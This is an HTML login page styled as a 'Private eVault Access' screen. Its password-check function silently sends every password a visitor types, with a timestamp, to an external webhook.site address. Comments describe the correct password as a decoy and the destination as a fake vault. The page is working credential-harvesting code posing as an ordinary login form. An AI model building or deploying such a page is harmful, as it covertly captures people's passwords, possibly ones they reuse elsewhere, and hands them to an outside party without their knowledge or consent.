<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Secure Vault Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    input[type="password"] {
      padding: 10px;
      width: 80%;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      border: none;
      background: #007bff;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    .error {
      color: red;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Private eVault Access</h2>
    <p>Please enter the vault password to continue</p>
    <input type="password" id="passwordInput" placeholder="Enter Password" />
    <br />
    <button onclick="validatePassword()">Access</button>
    <div id="errorMsg" class="error"></div>
  </div>  <script>
    function validatePassword() {
      const password = document.getElementById("passwordInput").value;
      const correctPassword = "testvault123"; // change to any decoy password
      const errorMsg = document.getElementById("errorMsg");

      // Log visitor access attempt (simple example)
      fetch("https://webhook.site/867ae5f4-7a7c-4aac-a47d-3ed80cdaea41", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ timestamp: new Date().toISOString(), triedPassword: password })
      });

      if (password === correctPassword) {
        window.location.href = "https://example.com/fake-vault"; // redirect to a fake vault or message
      } else {
        errorMsg.textContent = "Incorrect password.";
      }
    }
  </script></body>
</html>
